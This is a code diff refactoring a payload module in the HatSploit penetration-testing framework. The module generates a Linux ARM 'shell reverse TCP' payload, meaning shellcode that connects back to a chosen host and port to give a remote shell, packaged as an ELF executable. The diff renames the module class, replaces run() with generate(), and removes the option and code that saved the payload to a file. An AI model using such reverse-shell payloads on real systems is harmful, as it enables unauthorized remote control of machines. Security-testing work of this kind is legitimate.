@@ -24,29 +24,22 @@
 # SOFTWARE.
 #
 
-from core.lib.module import HatSploitModule
+from core.lib.payload import HatSploitPayload
 
 from utils.tcp.tcp import tcp
 from utils.payload.payload import payload
 
-class HatSploitModule(HatSploitModule):
+class HatSploitPayload(HatSploitPayload):
     tcp = tcp()
     payload = payload()
 
     details = {
         'Name': "Linux armle Shell Reverse TCP",
-        'Module': "payload/linux/armle/shell_reverse_tcp",
+        'Payload': "linux/armle/shell_reverse_tcp",
         'Authors': [
             'enty8080'
         ],
-        'Description': "Shell Reverse TCP Payload for Linux armle.",
-        'Dependencies': [
-            ''
-        ],
-        'Comments': [
-            ''
-        ],
-        'Risk': "low"
+        'Description': "Shell Reverse TCP Payload for Linux armle."
     }
 
     options = {
@@ -63,27 +56,21 @@ class HatSploitModule(HatSploitModule):
             'Required': True
         },
         'FORMAT': {
-            'Description': "Output format.",
+            'Description': "Executable format.",
             'Value': "elf",
-            'Type': None,
-            'Required': True
-        },
-        'LPATH': {
-            'Description': "Local path.",
-            'Value': "/tmp/payload.bin",
             'Type': None,
             'Required': True
         }
     }
 
-    def run(self):
-        local_host, local_port, file_format, local_file = self.parser.parse_options(self.options)
+    def generate(self):
+        local_host, local_port, executable_format = self.parser.parse_options(self.options)
 
         local_host = self.payload.host_to_bytes(local_host)
         local_port = self.payload.port_to_bytes(local_port)
 
-        if not file_format in self.payload.formats.keys():
-            self.badges.output_error("Invalid format!")
+        if not executable_format in self.payload.formats.keys():
+            self.badges.output_error("Invalid executable format!")
             return
 
         self.badges.output_process("Generating shellcode...")
@@ -109,9 +96,6 @@ class HatSploitModule(HatSploitModule):
         )
 
         self.badges.output_process("Generating payload...")
-        payload = self.payload.generate(file_format, 'armle', shellcode)
+        payload = self.payload.generate(executable_format, 'armle', shellcode)
         
-        self.badges.output_process("Saving to " + local_file + "...")
-        with open(local_file, 'wb') as f:
-            f.write(payload)
-        self.badges.output_success("Successfully saved to " + local_file + "!")
+        return payload
